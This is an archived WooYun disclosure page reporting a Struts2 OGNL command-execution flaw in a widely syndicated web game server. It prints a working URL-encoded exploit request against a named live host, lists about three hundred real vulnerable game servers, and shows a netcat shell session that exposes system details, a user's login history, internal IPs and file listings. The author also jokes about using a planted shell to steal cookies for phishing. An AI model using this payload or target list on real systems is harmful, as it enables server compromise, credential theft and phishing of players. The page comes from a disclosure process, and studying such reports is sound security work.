<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		某知名WebGame游戏服务端 存在命令执行漏洞  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		某知名WebGame游戏服务端 存在命令执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪猪侠">猪猪侠</a> 
</li><li>提交时间：		2013-07-15 14:09</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-07-15：	细节已通知厂商并且等待厂商处理中<br/>
									2013-07-15：	厂商已经确认，细节仅向厂商公开<br/>
									2013-07-25：	细节向核心白帽子及相关领域专家公开<br/>
									2013-08-04：	细节向普通白帽子公开<br/>
									2013-08-14：	细节向实习白帽子公开<br/>
									2013-08-29：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">由于游戏服务端使用了第三方框架，导致第三方框架存在的漏洞，重现在已运营的服务器之上。<br />
<br />
细看了下，4399、YY、51wan、duowan、51、91、浩方、360、kugou、七点、百度均代理了这款游戏，也就是说，直接在对应域名的服务器下上传一个shell，就能间接拿到对应代理公司的主域名COOKIE读写权限，跨站钓鱼调戏不亦乐乎！</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail"># 由于游戏服务端采用了Java Struts框架，导致命令执行漏洞存在！<br />
<br />
<br />
<br />
</p><pre><code>http://s58.as.game.yy.com/root/chat.action?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27/sbin/ifconfig%20-a%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23s3cur1ty%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23s3cur1ty.println%28%23d%29%2c%23s3cur1ty.close%28%29%29%28aa%29&amp;x[%28class.classLoader.jarPath%29%28%27aa%27%29]</code></pre><p class='detail'><br />
<br />
<br />
<br />
<br />
<br />
# 受影响域名，只是简单的搜索出来，astd22.my4399.com，代表前面还有astd21、astd20等20来个服务器；其他的同理。<br />
<br />
<br />
<br />
http://astd22.my4399.com/root/chat.action<br />
<br />
http://astd26.g.pps.tv/root/chat.action<br />
<br />
http://astd27.g.pps.tv/root/chat.action<br />
<br />
http://gameas4.pipi.cn/root/chat.action<br />
<br />
http://s1.as.8zy.com/root/chat.action<br />
<br />
http://s17.as.jinjuzi.com/root/chat.action<br />
<br />
http://s4.as.91.com/root/chat.action<br />
<br />
http://s4.astd.wan.rising.cn/root/chat.action<br />
<br />
http://s4.asyh.uoyoo.cn/root/chat.action<br />
<br />
http://s69.astd.6711.com/root/chat.action<br />
<br />
http://s7.astd.ifeng.com/root/chat.action<br />
<br />
http://td6.huanlang.com/root/chat.action<br />
<br />
http://td8.zhulang.com/root/chat.action<br />
<br />
http://as1.game.tiexue.net/root/chat.action<br />
<br />
http://astd.s1.53wan.com/root/chat.action<br />
<br />
http://s66.as.peiyou.com/root/chat.action<br />
<br />
http://as1.51wan.com/root/chat.action<br />
<br />
http://astd17.29ww.com/root/chat.action<br />
<br />
http://s319.as.yaowan.com/root/chat.action<br />
<br />
http://s622.as.yaowan.com/root/chat.action<br />
<br />
http://s11.astd.cga.com.cn/root/chat.action<br />
<br />
http://s167.as.yaowan.com/root/chat.action<br />
<br />
http://s3.astd.g.pptv.com/root/chat.action<br />
<br />
http://s588.as.yaowan.com/root/chat.action<br />
<br />
http://s80.astd.6711.com/root/chat.action<br />
<br />
http://astd10.youxi567.com/root/chat.action<br />
<br />
http://s1.3896.com/root/chat.action<br />
<br />
http://s28.astd.6711.com/root/chat.action<br />
<br />
http://s69.as.yaowan.com/root/chat.action<br />
<br />
http://s77.astd.6711.com/root/chat.action<br />
<br />
http://as2.neotv.jiuwan.com/root/chat.action<br />
<br />
http://s116.astd.37wan.com/root/chat.action<br />
<br />
http://s184.as.yaowan.com/root/chat.action<br />
<br />
http://s605.as.yaowan.com/root/chat.action<br />
<br />
http://x16.aoshi.renren.com/root/chat.action<br />
<br />
http://s1.as.158wan.com/root/chat.action<br />
<br />
http://s26.astd.37wan.com/root/chat.action<br />
<br />
http://s328.as.yaowan.com/root/chat.action<br />
<br />
http://s577.as.yaowan.com/root/chat.action<br />
<br />
http://s89.as.peiyou.com/root/chat.action<br />
<br />
http://x4.aoshi.renren.com/root/chat.action<br />
<br />
http://astd1.youxi567.com/root/chat.action<br />
<br />
http://astds8.snsfun.com/root/chat.action<br />
<br />
http://s1.as.96pk.com/root/chat.action<br />
<br />
http://s111.as.yaowan.com/root/chat.action<br />
<br />
http://s15.astd.kuwo.cn/root/chat.action<br />
<br />
http://s397.as.yaowan.com/root/chat.action<br />
<br />
http://s42.as.game.yy.com/root/chat.action<br />
<br />
http://s603.as.yaowan.com/root/chat.action<br />
<br />
http://astd.s5.53wan.com/root/chat.action<br />
<br />
http://s1.astd.smggame.net/root/chat.action<br />
<br />
http://s573.as.yaowan.com/root/chat.action<br />
<br />
http://s6.as.pcgames.com.cn/root/chat.action<br />
<br />
http://gameas1.pipi.cn/root/chat.action<br />
<br />
http://s2.astd.cga.com.cn/root/chat.action<br />
<br />
http://s298.as.yaowan.com/root/chat.action<br />
<br />
http://s59.as.yaowan.com/root/chat.action<br />
<br />
http://x12.aoshi.renren.com/root/chat.action<br />
<br />
http://x14.aoshi.renren.com/root/chat.action<br />
<br />
http://s1.as.aoshitang.com/root/chat.action<br />
<br />
http://s1.astd.6one.com.cn/root/chat.action<br />
<br />
http://s1.astd.91555.com/root/chat.action<br />
<br />
http://s123.as.yaowan.com/root/chat.action<br />
<br />
http://s17.astd.g.1360.com/root/chat.action<br />
<br />
http://s3.as.jinjuzi.com/root/chat.action<br />
<br />
http://s52.astd.6711.com/root/chat.action<br />
<br />
http://s585.as.yaowan.com/root/chat.action<br />
<br />
http://s8.astd.51.com/root/chat.action<br />
<br />
http://s92.astd.37wan.com/root/chat.action<br />
<br />
http://assvr1.webgame.xunlei.com/root/chat.action<br />
<br />
http://s16.as.56uu.com/root/chat.action<br />
<br />
http://s163.as.yaowan.com/root/chat.action<br />
<br />
http://s28.as.peiyou.com/root/chat.action<br />
<br />
http://s75.astd.37wan.com/root/chat.action<br />
<br />
http://res9.astd.cn/root/chat.action<br />
<br />
http://s101.as.yaowan.com/root/chat.action<br />
<br />
http://s6.astd.6711.com/root/chat.action<br />
<br />
http://td1.huanlang.com/root/chat.action<br />
<br />
http://x21.aoshi.renren.com/root/chat.action<br />
<br />
http://astd06.game.qidian.com/root/chat.action<br />
<br />
http://astd3.29ww.com/root/chat.action<br />
<br />
http://astds1.snsfun.com/root/chat.action<br />
<br />
http://s01.as.3722.com/root/chat.action<br />
<br />
http://s32.baidu.astd.cn/root/chat.action<br />
<br />
http://s62.as.game.yy.com/root/chat.action<br />
<br />
http://astd07.game.qidian.com/root/chat.action<br />
<br />
http://s103.as.yaowan.com/root/chat.action<br />
<br />
http://s534.as.yaowan.com/root/chat.action<br />
<br />
http://s94.astd.6711.com/root/chat.action<br />
<br />
http://s18.as.game.yy.com/root/chat.action<br />
<br />
http://s613.as.yaowan.com/root/chat.action<br />
<br />
http://frxxz11.game.bnbwan.com/root/chat.action<br />
<br />
http://frxxz12.game.bnbwan.com/root/chat.action<br />
<br />
http://s17.baidu.astd.cn/root/chat.action<br />
<br />
http://s621.as.yaowan.com/root/chat.action<br />
<br />
http://s95.as.peiyou.com/root/chat.action<br />
<br />
http://td09.jianggame.com/root/chat.action<br />
<br />
http://td23.zhulang.com/root/chat.action<br />
<br />
http://s34.astd.6711.com/root/chat.action<br />
<br />
http://s427.as.yaowan.com/root/chat.action<br />
<br />
http://s608.as.yaowan.com/root/chat.action<br />
<br />
http://s79.as.yaowan.com/root/chat.action<br />
<br />
http://s9.as.56uu.com/root/chat.action<br />
<br />
http://td17.zhulang.com/root/chat.action<br />
<br />
http://5.astd.youwo.com/root/chat.action<br />
<br />
http://s1.astd.kuwo.cn/root/chat.action<br />
<br />
http://astd09.game.qidian.com/root/chat.action<br />
<br />
http://s10.astd.cga.com.cn/root/chat.action<br />
<br />
http://s2.astd.tianya.cn/root/chat.action<br />
<br />
http://s59.as.peiyou.com/root/chat.action<br />
<br />
http://s632.as.yaowan.com/root/chat.action<br />
<br />
http://s9.astd.cga.com.cn/root/chat.action<br />
<br />
http://x1.aoshi.renren.com/root/chat.action<br />
<br />
http://astd44.g.pps.tv/root/chat.action<br />
<br />
http://hs35.as.yaowan.com/root/chat.action<br />
<br />
http://s32.astd.g.1360.cn/root/chat.action<br />
<br />
http://s32.astd.g.1360.com/root/chat.action<br />
<br />
http://s56.as.peiyou.com/root/chat.action<br />
<br />
http://s582.as.yaowan.com/root/chat.action<br />
<br />
http://s66.as.game.yy.com/root/chat.action<br />
<br />
http://td001.webxgame.com/root/chat.action<br />
<br />
http://td50.zhulang.com/root/chat.action<br />
<br />
http://x20.aoshi.renren.com/root/chat.action<br />
<br />
http://s2.frxx.qidian.com/root/chat.action<br />
<br />
http://s3.frxx.qidian.com/root/chat.action<br />
<br />
http://s82.as.yaowan.com/root/chat.action<br />
<br />
http://s8.frxx.qidian.com/root/chat.action<br />
<br />
http://s9.frxx.qidian.com/root/chat.action<br />
<br />
http://s616.as.yaowan.com/root/chat.action<br />
<br />
http://s77.as.yaowan.com/root/chat.action<br />
<br />
http://tdh1.kuwan8.com/root/chat.action<br />
<br />
http://wap.astd.cn/root/chat.action<br />
<br />
http://118.26.234.23/root/chat.action<br />
<br />
http://s241.as.yaowan.com/root/chat.action<br />
<br />
http://s479.as.yaowan.com/root/chat.action<br />
<br />
http://s66.astd.37wan.com/root/chat.action<br />
<br />
http://s211.as.yaowan.com/root/chat.action<br />
<br />
http://s280.as.yaowan.com/root/chat.action<br />
<br />
http://s5.as.kugou.com/root/chat.action<br />
<br />
http://s629.as.yaowan.com/root/chat.action<br />
<br />
http://s89.as.yaowan.com/root/chat.action<br />
<br />
http://s7.frxx.qidian.com/root/chat.action<br />
<br />
http://s482.as.yaowan.com/root/chat.action<br />
<br />
http://s71.astd.37wan.com/root/chat.action<br />
<br />
http://s91.as.peiyou.com/root/chat.action<br />
<br />
http://s126.astd.37wan.com/root/chat.action<br />
<br />
http://s169.as.yaowan.com/root/chat.action<br />
<br />
http://s82.as.peiyou.com/root/chat.action<br />
<br />
http://s93.as.game.yy.com/root/chat.action<br />
<br />
http://118.26.234.28/root/chat.action<br />
<br />
http://s129.as.yaowan.com/root/chat.action<br />
<br />
http://s130.as.yaowan.com/root/chat.action<br />
<br />
http://s24.as.womenwan.com/root/chat.action<br />
<br />
http://astds3.snsfun.com/root/chat.action<br />
<br />
http://s561.as.yaowan.com/root/chat.action<br />
<br />
http://s72.as.game.yy.com/root/chat.action<br />
<br />
http://s78.as.peiyou.com/root/chat.action<br />
<br />
http://astd24.g.pps.tv/root/chat.action<br />
<br />
http://s1.astd.ifeng.com/root/chat.action<br />
<br />
http://s10.as.8zy.com/root/chat.action<br />
<br />
http://s100.as.yaowan.com/root/chat.action<br />
<br />
http://s2.astd.6one.com.cn/root/chat.action<br />
<br />
http://s2.astd.wan.rising.cn/root/chat.action<br />
<br />
http://s7.as.aoshitang.com/root/chat.action<br />
<br />
http://s7.as.jiuwan.com/root/chat.action<br />
<br />
http://s99.as.yaowan.com/root/chat.action<br />
<br />
http://td30.huanlang.com/root/chat.action<br />
<br />
http://td37.jianggame.com/root/chat.action<br />
<br />
http://x19.aoshi.renren.com/root/chat.action<br />
<br />
http://s93.as.yaowan.com/root/chat.action<br />
<br />
http://s94.as.yaowan.com/root/chat.action<br />
<br />
http://s134.as.yaowan.com/root/chat.action<br />
<br />
http://s132.astd.37wan.com/root/chat.action<br />
<br />
http://s204.as.yaowan.com/root/chat.action<br />
<br />
http://s205.as.yaowan.com/root/chat.action<br />
<br />
http://s612.as.yaowan.com/root/chat.action<br />
<br />
http://s232.as.yaowan.com/root/chat.action<br />
<br />
http://s50.as.game.yy.com/root/chat.action<br />
<br />
http://s54.astd.6711.com/root/chat.action<br />
<br />
http://s57.as.peiyou.com/root/chat.action<br />
<br />
http://astd25.g.pps.tv/root/chat.action<br />
<br />
http://hs35.as.yaowan.com/root/chat.action<br />
<br />
http://s10-x.as.178.com/root/chat.action<br />
<br />
http://s136.as.yaowan.com/root/chat.action<br />
<br />
http://s28.astd.g.1360.com/root/chat.action<br />
<br />
http://s5.3896.com/root/chat.action<br />
<br />
http://s82.as.game.yy.com/root/chat.action<br />
<br />
http://s104.as.peiyou.com/root/chat.action<br />
<br />
http://s29.as.aoshitang.com/root/chat.action<br />
<br />
http://s29.as.jiuwan.com/root/chat.action<br />
<br />
http://s373.as.yaowan.com/root/chat.action<br />
<br />
http://s56.astd.37wan.com/root/chat.action<br />
<br />
http://as1.game.verycd.com/root/chat.action<br />
<br />
http://astd34.g.pps.tv/root/chat.action<br />
<br />
http://s41.as.aoshitang.com/root/chat.action<br />
<br />
http://s58.as.peiyou.com/root/chat.action<br />
<br />
http://s625.as.yaowan.com/root/chat.action<br />
<br />
http://td31.huanlang.com/root/chat.action<br />
<br />
http://s1.astd.g.pptv.com/root/chat.action<br />
<br />
http://s13.as.womenwan.com/root/chat.action<br />
<br />
http://s443.as.yaowan.com/root/chat.action<br />
<br />
http://s52.as.game.yy.com/root/chat.action<br />
<br />
http://s596.as.yaowan.com/root/chat.action<br />
<br />
http://s79.astd.6711.com/root/chat.action<br />
<br />
http://s8.astd.game2.com.cn/root/chat.action<br />
<br />
http://astd1.uusee.com/root/chat.action<br />
<br />
http://s170.as.yaowan.com/root/chat.action<br />
<br />
http://s3.astd.51.com/root/chat.action<br />
<br />
http://s265.as.yaowan.com/root/chat.action<br />
<br />
http://s266.as.yaowan.com/root/chat.action<br />
<br />
http://astd1.78bar.com/root/chat.action<br />
<br />
http://astds5.snsfun.com/root/chat.action<br />
<br />
http://s105.as.yaowan.com/root/chat.action<br />
<br />
http://s4.astd.6711.com/root/chat.action<br />
<br />
http://s46.as.aoshitang.com/root/chat.action<br />
<br />
http://as901.51wan.com/root/chat.action<br />
<br />
http://s1.as.kugou.com/root/chat.action<br />
<br />
http://s139.as.yaowan.com/root/chat.action<br />
<br />
http://s140.as.yaowan.com/root/chat.action<br />
<br />
http://s38.astd.6711.com/root/chat.action<br />
<br />
http://s1.astd.51.com/root/chat.action<br />
<br />
http://s510.as.yaowan.com/root/chat.action<br />
<br />
http://s29.astd.game2.com.cn/root/chat.action<br />
<br />
http://s48.as.aoshitang.com/root/chat.action<br />
<br />
http://s50.astd.37wan.com/root/chat.action<br />
<br />
http://s103.astd.37wan.com/root/chat.action<br />
<br />
http://s14.as.jiuwan.com/root/chat.action<br />
<br />
http://s38.astd.g.1360.com/root/chat.action<br />
<br />
http://s551.as.yaowan.com/root/chat.action<br />
<br />
http://as14.xdwan.com/root/chat.action<br />
<br />
http://s549.as.yaowan.com/root/chat.action<br />
<br />
http://s1.astd.37wan.com/root/chat.action<br />
<br />
http://s16.as.yaowan.com/root/chat.action<br />
<br />
http://s39.as.peiyou.com/root/chat.action<br />
<br />
http://s611.as.yaowan.com/root/chat.action<br />
<br />
http://s10.as.91.com/root/chat.action<br />
<br />
http://s122.astd.37wan.com/root/chat.action<br />
<br />
http://s4.astd.g.pptv.com/root/chat.action<br />
<br />
http://s521.as.yaowan.com/root/chat.action<br />
<br />
http://s576.as.yaowan.com/root/chat.action<br />
<br />
http://td62.webxgame.com/root/chat.action<br />
<br />
http://s3.as.yaowan.com/root/chat.action<br />
<br />
http://s6.astd.g.1360.com/root/chat.action<br />
<br />
http://as1.neotv.jiuwan.com/root/chat.action<br />
<br />
http://astd29.g.pps.tv/root/chat.action<br />
<br />
http://astd9.uusee.com/root/chat.action<br />
<br />
http://s1.as.uc55.cn/root/chat.action<br />
<br />
http://s1.astd.g.1360.com/root/chat.action<br />
<br />
http://s11.astd.ifeng.com/root/chat.action<br />
<br />
http://s143.as.yaowan.com/root/chat.action<br />
<br />
http://s35.as.aoshitang.com/root/chat.action<br />
<br />
http://s592.as.yaowan.com/root/chat.action<br />
<br />
http://s6.astd.baofenggame.com/root/chat.action<br />
<br />
http://s6.astd.wan.rising.cn/root/chat.action<br />
<br />
http://s70.as.game.yy.com/root/chat.action<br />
<br />
http://as17.xdwan.com/root/chat.action<br />
<br />
http://s145.as.yaowan.com/root/chat.action<br />
<br />
http://s464.as.yaowan.com/root/chat.action<br />
<br />
http://s83.astd.37wan.com/root/chat.action<br />
<br />
http://s88.as.yaowan.com/root/chat.action<br />
<br />
http://astd01.game.qidian.com/root/chat.action<br />
<br />
http://s1.as.womenwan.com/root/chat.action<br />
<br />
http://s124.as.womenwan.com/root/chat.action<br />
<br />
http://s421.as.yaowan.com/root/chat.action<br />
<br />
http://s571.as.yaowan.com/root/chat.action<br />
<br />
http://s20.as.56uu.com/root/chat.action<br />
<br />
http://s497.as.yaowan.com/root/chat.action<br />
<br />
http://s78.as.game.yy.com/root/chat.action<br />
<br />
http://s1.astd.snstele.com/root/chat.action<br />
<br />
http://s22.as.yaowan.com/root/chat.action<br />
<br />
http://s590.as.yaowan.com/root/chat.action<br />
<br />
http://td25.huanlang.com/root/chat.action<br />
<br />
http://as3.neotv.jiuwan.com/root/chat.action<br />
<br />
http://s1.as.3737.com/root/chat.action<br />
<br />
http://s188.as.yaowan.com/root/chat.action<br />
<br />
http://s40.as.peiyou.com/root/chat.action<br />
<br />
http://s40.as.womenwan.com/root/chat.action<br />
<br />
http://s595.as.yaowan.com/root/chat.action<br />
<br />
http://s1.kaixin.astd.cn/root/chat.action<br />
<br />
http://s539.as.yaowan.com/root/chat.action<br />
<br />
http://s80.as.peiyou.com/root/chat.action<br />
<br />
http://s171.as.yaowan.com/root/chat.action<br />
<br />
http://s32.as.peiyou.com/root/chat.action<br />
<br />
http://x7.aoshi.renren.com/root/chat.action<br />
<br />
http://s1.astd.niua.com/root/chat.action<br />
<br />
http://s5.as.womenwan.com/root/chat.action<br />
<br />
http://s620.as.yaowan.com/root/chat.action<br />
<br />
http://s9-x.as.178.com/root/chat.action<br />
<br />
http://s148.as.yaowan.com/root/chat.action<br />
<br />
http://s525.as.yaowan.com/root/chat.action<br />
<br />
http://s113.astd.37wan.com/root/chat.action<br />
<br />
http://s352.as.yaowan.com/root/chat.action<br />
<br />
http://s574.as.yaowan.com/root/chat.action<br />
<br />
http://td15.webxgame.com/root/chat.action<br />
<br />
http://astd.s3.53wan.com/root/chat.action<br />
<br />
http://s455.as.yaowan.com/root/chat.action<br />
<br />
http://s103.as.peiyou.com/root/chat.action<br />
<br />
http://s50.as.56uu.com/root/chat.action<br />
<br />
http://s500.as.yaowan.com/root/chat.action<br />
<br />
http://s609.as.yaowan.com/root/chat.action<br />
<br />
http://s14.astd.37wan.com/root/chat.action<br />
<br />
http://s1-x.as.178.com/root/chat.action<br />
<br />
http://s75.as.yaowan.com/root/chat.action<br />
<br />
http://s8.as.91.com/root/chat.action<br />
<br />
http://s514.as.yaowan.com/root/chat.action<br />
<br />
http://s560.as.yaowan.com/root/chat.action<br />
<br />
http://td5.zhulang.com/root/chat.action<br />
<br />
http://s1.baidu.astd.cn/root/chat.action<br />
<br />
http://s1.weibo.astd.cn/root/chat.action<br />
<br />
http://s133.as.yaowan.com/root/chat.action<br />
<br />
http://s1.astd.cga.com.cn/root/chat.action<br />
<br />
http://s1.astd.uz73.com/root/chat.action<br />
<br />
http://s2.astd.cga.com.cn/root/chat.action<br />
<br />
http://s30.as.jinjuzi.com/root/chat.action<br />
<br />
http://s34.astd.37wan.com/root/chat.action<br />
<br />
http://as15.51wan.com/root/chat.action<br />
<br />
http://as16.xdwan.com/root/chat.action<br />
<br />
http://s1.astd.ipark.cn/root/chat.action<br />
<br />
http://s107.as.peiyou.com/root/chat.action<br />
<br />
http://s155.as.yaowan.com/root/chat.action<br />
<br />
http://s384.as.yaowan.com/root/chat.action<br />
<br />
http://as1.xdwan.com/root/chat.action<br />
<br />
http://s30.baidu.astd.cn/root/chat.action<br />
<br />
http://s512.as.yaowan.com/root/chat.action<br />
<br />
http://s76.as.peiyou.com/root/chat.action<br />
<br />
http://s77.as.game.yy.com/root/chat.action<br />
<br />
http://s12.astd.cga.com.cn/root/chat.action<br />
<br />
http://s406.as.yaowan.com/root/chat.action<br />
<br />
http://s530.as.yaowan.com/root/chat.action<br />
<br />
http://s607.as.yaowan.com/root/chat.action<br />
<br />
http://td41.zhulang.com/root/chat.action<br />
<br />
http://s433.as.yaowan.com/root/chat.action<br />
<br />
http://s1.as.pcgames.com.cn/root/chat.action<br />
<br />
http://s244.as.yaowan.com/root/chat.action<br />
<br />
http://s31.astd.game2.com.cn/root/chat.action<br />
<br />
http://s40.astd.g.1360.com/root/chat.action<br />
<br />
http://s108.as.game.yy.com/root/chat.action<br />
<br />
http://s248.as.yaowan.com/root/chat.action<br />
<br />
http://s34.astd.g.1360.com/root/chat.action<br />
<br />
http://s45.as.aoshitang.com/root/chat.action<br />
<br />
http://s62.as.peiyou.com/root/chat.action<br />
<br />
http://as44.xdwan.com/root/chat.action<br />
<br />
http://s34.as.game.yy.com/root/chat.action<br />
<br />
http://td59.zhulang.com/root/chat.action<br />
<br />
http://s13.astd.kuwo.cn/root/chat.action<br />
<br />
http://s470.as.yaowan.com/root/chat.action<br />
<br />
http://td89.webxgame.com/root/chat.action<br />
<br />
http://s115.as.yaowan.com/root/chat.action<br />
<br />
http://s116.as.yaowan.com/root/chat.action<br />
<br />
http://s24.astd.game2.com.cn/root/chat.action<br />
<br />
http://s49.astd.6711.com/root/chat.action<br />
<br />
http://s51.as.aoshitang.com/root/chat.action<br />
<br />
http://as1.29293.com/root/chat.action<br />
<br />
http://astd20.g.pps.tv/root/chat.action<br />
<br />
http://s01.as.175pt.net/root/chat.action<br />
<br />
http://s11.as.8zy.com/root/chat.action<br />
<br />
http://s12.as.aoshitang.com/root/chat.action<br />
<br />
http://s3.asyh.uoyoo.cn/root/chat.action<br />
<br />
http://s579.as.yaowan.com/root/chat.action<br />
<br />
http://s7-x.as.178.com/root/chat.action<br />
<br />
http://s-9.as.jinjuzi.com/root/chat.action<br />
<br />
http://as1.91wan.com/root/chat.action<br />
<br />
http://s41.as.yaowan.com/root/chat.action<br />
<br />
http://s5.astd.cga.com.cn/root/chat.action<br />
<br />
http://s11-x.as.178.com/root/chat.action<br />
<br />
http://s1-2.astd.kuaiwan.com/root/chat.action<br />
<br />
http://s208.as.yaowan.com/root/chat.action<br />
<br />
http://s9.as.kugou.com/root/chat.action<br />
<br />
http://td18.huanlang.com/root/chat.action<br />
<br />
http://s119.as.yaowan.com/root/chat.action<br />
<br />
http://s68.as.game.yy.com/root/chat.action<br />
<br />
http://td86.webxgame.com/root/chat.action<br />
<br />
http://s200.as.yaowan.com/root/chat.action<br />
<br />
http://s33.baidu.astd.cn/root/chat.action<br />
<br />
http://s46.as.peiyou.com/root/chat.action<br />
<br />
http://s507.as.yaowan.com/root/chat.action<br />
<br />
http://s1.astd.funshion.com/root/chat.action<br />
<br />
http://s15.3896.com/root/chat.action<br />
<br />
http://s511.as.yaowan.com/root/chat.action<br />
<br />
http://s57.as.yaowan.com/root/chat.action<br />
<br />
http://s578.as.yaowan.com/root/chat.action<br />
<br />
http://astd14.g.pps.tv/root/chat.action<br />
<br />
http://s1.astd.game2.com.cn/root/chat.action<br />
<br />
http://astd19.g.pps.tv/root/chat.action<br />
<br />
http://s1.as.yaowan.com/root/chat.action<br />
<br />
http://s53.as.aoshitang.com/root/chat.action<br />
<br />
http://s85.astd.6711.com/root/chat.action<br />
<br />
http://astds11.snsfun.com/root/chat.action<br />
<br />
http://s391.as.yaowan.com/root/chat.action<br />
<br />
http://x23.aoshi.renren.com/root/chat.action<br />
<br />
http://s11.astd.51.com/root/chat.action<br />
<br />
http://s147.as.peiyou.com/root/chat.action<br />
<br />
http://s182.as.yaowan.com/root/chat.action<br />
<br />
http://s36.astd.g.1360.com/root/chat.action<br />
<br />
http://s518.as.yaowan.com/root/chat.action<br />
<br />
http://td17.webxgame.com/root/chat.action<br />
<br />
http://s100.astd.37wan.com/root/chat.action<br />
<br />
http://s499.as.yaowan.com/root/chat.action<br />
<br />
http://s8.astd.6711.com/root/chat.action<br />
<br />
http://s27.as.56uu.com/root/chat.action<br />
<br />
http://s4-x.as.178.com/root/chat.action<br />
<br />
http://s584.as.yaowan.com/root/chat.action<br />
<br />
http://s601.as.yaowan.com/root/chat.action<br />
<br />
http://s11.astd.kuwo.cn/root/chat.action<br />
<br />
http://s165.as.yaowan.com/root/chat.action<br />
<br />
http://s532.as.yaowan.com/root/chat.action<br />
<br />
http://astd.s2.53wan.com/root/chat.action<br />
<br />
http://s1.as.kedou.com/root/chat.action<br />
<br />
http://s630.as.yaowan.com/root/chat.action<br />
<br />
http://td1.zhulang.com/root/chat.action<br />
<br />
http://s1.as.feixue.com/root/chat.action<br />
<br />
http://s25.baidu.astd.cn/root/chat.action<br />
<br />
http://s43.as.aoshitang.com/root/chat.action<br />
<br />
http://s558.as.yaowan.com/root/chat.action<br />
<br />
http://s13-x.as.178.com/root/chat.action<br />
<br />
http://s253.as.yaowan.com/root/chat.action<br />
<br />
http://s58.as.game.yy.com/root/chat.action<br />
<br />
http://td13.zhulang.com/root/chat.action<br />
<br />
http://s27.baidu.astd.cn/root/chat.action<br />
<br />
http://s45.astd.6711.com/root/chat.action<br />
<br />
http://s536.as.yaowan.com/root/chat.action<br />
<br />
http://s54.as.game.yy.com/root/chat.action<br />
<br />
http://td56.zhulang.com/root/chat.action<br />
<br />
http://s223.as.yaowan.com/root/chat.action<br />
<br />
http://s3.astd.cga.com.cn/root/chat.action<br />
<br />
http://s545.as.yaowan.com/root/chat.action<br />
<br />
http://s277.as.yaowan.com/root/chat.action<br />
<br />
http://s540.as.yaowan.com/root/chat.action<br />
<br />
http://s566.as.yaowan.com/root/chat.action<br />
<br />
http://s9.3896.com/root/chat.action<br />
<br />
 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>[root@localhost ~]# nc -l 53<br />
Linux astd-f07-06.bjkd 2.6.18-164.el5 #1 SMP Thu Sep 3 03:28:30 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux<br />
uid=500(astd) gid=500(astd) groups=500(astd) context=user_u:system_r:unconfined_t:s0<br />
last -n 10<br />
xujp     pts/0        10.6.20.242      Mon Jul 15 11:02   still logged in   <br />
xujp     pts/1        10.6.20.242      Fri Jul 12 16:57 - 17:57  (01:00)    <br />
xujp     pts/0        10.6.20.241      Fri Jul 12 16:29 - 21:11  (04:41)    <br />
xujp     pts/0        10.6.20.241      Fri Jul 12 11:18 - 13:10  (01:52)    <br />
xujp     pts/0        10.6.20.241      Thu Jul 11 17:58 - 21:10  (03:12)    <br />
xujp     pts/0        10.6.20.241      Thu Jul 11 15:29 - 17:30  (02:00)    <br />
xujp     pts/0        10.6.20.241      Thu Jul 11 09:39 - 15:11  (05:31)    <br />
xujp     pts/0        10.6.20.241      Wed Jul 10 17:32 - 21:06  (03:34)    <br />
xujp     pts/0        10.6.20.241      Wed Jul 10 12:34 - 15:08  (02:34)    <br />
xujp     pts/0        10.6.20.241      Tue Jul  9 17:48 - 21:08  (03:19)    <br />
<br />
wtmp begins Tue Apr 10 00:53:09 2012<br />
uname -a<br />
Linux astd-f07-06.bjkd 2.6.18-164.el5 #1 SMP Thu Sep 3 03:28:30 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux<br />
cd ~<br />
ls -lah<br />
total 5.8M<br />
drwx------ 12 astd astd 4.0K Jul 14 18:36 .<br />
drwxr-xr-x  7 root root 4.0K May  4 12:49 ..<br />
-rw-r--r--  1 astd astd   84 Jun  9 16:53 178_13_0609<br />
-rw-rw-r--  1 astd astd   24 Jun 28 15:24 178_13.log<br />
-rw-rw-r--  1 astd astd    0 Jun 28 15:24 178_13_ticket.flag<br />
drwxrwxr-x  2 astd astd 4.0K May 31 12:37 astd_178_13_20130531<br />
drwxrwxr-x  2 astd astd 4.0K May 31 12:39 astd_duowan_58_20130531<br />
-rw-r--r--  1 astd astd  54K May 27 18:40 astd-listener.jar<br />
-rw-rw-r--  1 astd astd 5.4M Jun 28 11:02 astd_patch_astd_7-9-0-3_20130628.tar.gz<br />
drwxrwxr-x  2 astd astd 4.0K May 31 12:40 astd_peiyou_64_20130531<br />
-rw-rw-r--  1 astd astd   45 Jul 14 18:31 astd_peiyou_64.tgz<br />
-rw-r--r--  1 astd astd 5.6K Jul  5 13:21 astd_update_7-9-0_global.sh<br />
-rw-rw-r--  1 astd astd 5.3K Jun 28 12:54 astd_update_7-9-0.sh<br />
drwxrwxr-x  2 astd astd 4.0K May 31 12:42 astd_yaowan_253_20130531<br />
drwxrwxr-x  2 astd astd 4.0K May 31 12:43 astd_zhulang_13_20130531<br />
-rw-------  1 astd astd 7.6K Jul  9 11:10 .bash_history<br />
-rw-r--r--  1 astd astd  176 Jul  9 11:11 .bash_profile<br />
-rw-rw-r--  1 astd astd  178 Jun 16 22:18 .bashrc<br />
-rw-rw-r--  1 astd astd   53 Jun  1 08:53 .bs.tomcat.id<br />
drwxrwxr-x  2 astd astd 4.0K Jun 22 12:58 dbbak<br />
